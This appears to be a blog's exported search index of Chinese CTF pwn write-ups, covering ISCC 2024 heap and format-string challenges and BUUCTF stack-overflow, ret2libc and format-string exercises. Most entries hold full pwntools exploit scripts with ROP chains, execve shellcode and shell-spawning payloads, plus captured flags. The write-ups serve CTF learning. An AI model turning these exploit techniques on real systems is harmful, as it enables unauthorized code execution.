<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024 iscc</title>
    <url>/2025/04/06/2024iscc%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>又快iscc了复现一下去年的，打这个比赛的时候还是个刚入门的小菜鸡</p>
<h2 id="ISCC-U"><a href="#ISCC-U" class="headerlink" title="ISCC_U"></a>ISCC_U</h2><p>和hicton lab中的那个UAF一样，但没有后门函数需要泄露地址，堆块限制5个</p>
<p>思路：</p>
<ol>
<li>通过unsortedbin泄露地址</li>
<li>uaf嘛，借助hicton lab那道题的思想，篡改结构体中的print_note_content的指针为system</li>
</ol>
<p>glibc2.23的情况下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./iscc_U&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;What\&#x27;s your choice :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;dada&#x27;</span>)</span><br><span class="line">data = uu32(r(<span class="number">4</span>)) - <span class="number">0x1b07b0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,data)</span><br><span class="line">system_addr = data + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = data + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = data + gadgets[<span class="number">0</span>]</span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>, p32(system_addr) + <span class="string">b&#x27;;sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>glibc2.31的情况下，思路一样，第一个堆块要大于0x400放入unsortedbin中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./iscc_U&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;What\&#x27;s your choice :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;dada&#x27;</span>)</span><br><span class="line">data = uu32(r(<span class="number">4</span>)) - <span class="number">0x1b07b0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,data)</span><br><span class="line">system_addr = data + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = data + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>, p32(system_addr) + <span class="string">b&#x27;;sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>32位get shell : <code>add(0x8, p32(system_addr) + b&#39;;sh\x00&#39;)</code></p>
<h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h2><p>有沙盒</p>
<p>但是四个功能齐全</p>
<h2 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h2><p>格式化字符串 + ret2syscall</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-14 21:13:06</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">fmt = <span class="string">b&#x27;%31$p&#x27;</span></span><br><span class="line">bin_sh = <span class="number">0x080bb7c8</span> </span><br><span class="line">int_80 = <span class="number">0x0806cf83</span></span><br><span class="line">eax = <span class="number">0x080b8666</span></span><br><span class="line">edcbx = <span class="number">0x0806f330</span></span><br><span class="line">mprotect = <span class="number">0x0806E3D0</span></span><br><span class="line">ru(<span class="string">b&#x27;Would you like to say something to it?&#x27;</span>)</span><br><span class="line">sl(fmt)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">ru(<span class="string">b&quot; (  ^.^  ) \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x64</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span> </span><br><span class="line">payload += p32(eax) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(edcbx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"><span class="comment">##用mprotect()这个bss的位置可能需要调一下</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>)+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>)</span><br><span class="line">payload += p32(mprotect)+p32(edcbx)+p32(<span class="number">7</span>)+p32(<span class="number">0x1000</span>)+p32(bss)</span><br><span class="line">payload += p32(read)+p32(edcbx)+p32(<span class="number">0x100</span>)+p32(bss)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">sl(payload)</span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line">sl(shellcode)</span><br></pre></td></tr></table></figure>

<h3 id="32位寄存器传参"><a href="#32位寄存器传参" class="headerlink" title="32位寄存器传参"></a>32位寄存器传参</h3><p><strong>寄存器传递</strong>：</p>
<ul>
<li>前 5 个整型或指针类型的参数通过寄存器传递。这些寄存器是：<ul>
<li><code>EAX</code>：用于返回值</li>
<li><code>EBX</code>、<code>ECX</code>、<code>EDX</code>、<code>ESI</code> 和 <code>EDI</code>：用于传递参数（参数列表从左到右的顺序）</li>
</ul>
</li>
</ul>
<h3 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h3><p><code>mprotect()</code> 函数是一个系统调用，用于更改已映射内存区域的保护属性。它通常在需要更改内存区域的访问权限时使用，例如在实现内存保护、执行代码或读写操作时。<code>mprotect()</code> 函数通常用于操作系统的内存管理，特别是在 Unix&#x2F;Linux 系统中。</p>
<p><strong>函数原型</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li><strong><code>addr</code></strong>：指向要更改保护属性的内存区域的起始地址。该地址必须是页面大小的倍数，通常为 4096 字节（4KB）。</li>
<li><strong><code>len</code></strong>：要更改保护属性的内存区域的长度（以字节为单位）。同样，这个值也必须是页面大小的倍数。</li>
<li><strong><code>prot</code></strong>：新的保护属性标志，可以是以下之一的组合：<ul>
<li><code>PROT_READ</code>：允许读取。</li>
<li><code>PROT_WRITE</code>：允许写入。</li>
<li><code>PROT_EXEC</code>：允许执行。</li>
<li><code>PROT_NONE</code>：禁止访问。</li>
</ul>
</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li><p>如果成功，<code>mprotect()</code> 返回 0。</p>
</li>
<li><p>如果失败，返回 -1，并且设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">errno</span><br></pre></td></tr></table></figure>

<p>以指示错误类型。常见的错误包括：</p>
<ul>
<li><code>EINVAL</code>：无效的参数（例如，<code>addr</code> 不是页面大小的倍数）。</li>
<li><code>ENOMEM</code>：请求的内存区域无法访问。</li>
<li><code>EPERM</code>：试图设置不允许的保护属性（例如，尝试执行一个没有执行权限的内存区域）。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>_IO_FILE 源码解读</title>
    <url>/2025/04/02/IO_FILE/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="49bedeb8659940530fa8d6749167485d3f47a13531b59d1b5e49d664ff7a58ac">aa660c56d9a2d8389cfc1a02879f4fc7ffa208fe82d326b460cf8b1a66c062d6</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf</title>
    <url>/2025/04/15/buuctf(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</url>
    <content><![CDATA[<h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>题目给出ubuntu18,.且是64位程序需要考虑栈平衡</p>
<p>lambda部分省略</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">flag = <span class="number">0x401186</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(flag)</span><br><span class="line"><span class="comment">#ru(b&#x27;please input&#x27;)</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">flag&#123;2b384cc7-6cc9-4d5e-a659-0635a86cdad5&#125;</span><br></pre></td></tr></table></figure>

<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>ubuntu16.04，题目给出了一个地址可以<code>cat flag.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru(<span class="string">b&#x27;WOW:&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(flag))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(flag)</span><br><span class="line">ru(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>栈溢出修改栈上的变量，计算出两个变量的位之差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28132</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2c</span> + struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, <span class="number">11.28125</span>) <span class="comment"># + p64(0x41348000)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>ubuntu16.04（在其他版本也行）程序将<code>I</code>替换为<code>you</code>通过<code>strcpy</code>造成了溢出，有后门函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">padding = <span class="number">20</span> <span class="comment"># 0x3c = 60; 60/3=20;</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*padding + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>



<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>ubuntu16.04 read()栈溢出有后门</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">flag&#123;16a465c7-eed0-4eda-8fcb-dd5ca85ee50d&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>格式化字符串，任意地址写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路一：格式化字符串改atoi为system，第二次读入&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">1atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">p.recv()</span><br><span class="line">sl(payload)</span><br><span class="line">p.recv()</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"><span class="comment"># 思路二：改passwd 用fmstr_payload 需要指定架构</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p32(0x0804C044)+p32(0x0804C045)+p32(0x0804C046)+p32(0x0804C047)+b&quot;%10$n%11$n%12$n%13$n&quot;</span></span><br><span class="line"><span class="comment"># 这一种改0x0804c044的随机值为0x10101010</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804c044</span>:<span class="number">0x666</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">passwd = <span class="built_in">str</span>(<span class="number">0x666</span>)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>read()溢出，有system和&#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bin_sh = <span class="number">0x0804A024</span></span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line">flag&#123;d935d6a8-444a-4bab-896f-32f177ac0db9&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>直接写入14个p32(17)就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,29574)</span><br><span class="line">[x] Opening connection to node5.buuoj.cn on port 29574</span><br><span class="line">[x] Opening connection to node5.buuoj.cn on port 29574: Trying 117.21.200.176</span><br><span class="line">[+] Opening connection to node5.buuoj.cn on port 29574: Done</span><br><span class="line">&gt;&gt;&gt; payload = p32(17)*14</span><br><span class="line">&gt;&gt;&gt; p.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>自己输入输入长度，溢出，有后门</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru(<span class="string">b&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[+]What\&#x27;s u name?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x4006e6</span>))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>strlen()有<code>&#39;\0&#39;</code>截断，所以在加密函数中可以直接跳出循环，然后打ret2libc即可</p>
<p>libc版本，buu上的64位2.27</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_plt = <span class="number">0x4006e0</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">padding = <span class="number">0x50</span> + <span class="number">8</span> - <span class="number">1</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x4009a0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Input your choice!&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">puts_addr = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*padding + p64(ret) + p64(pop_rdi) + p64(bin_sh) +p64(system) + p64(<span class="number">0</span>) </span><br><span class="line">ru(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>C语言代码伪代码要一行一行分析，分析循环跳出的条件</p>
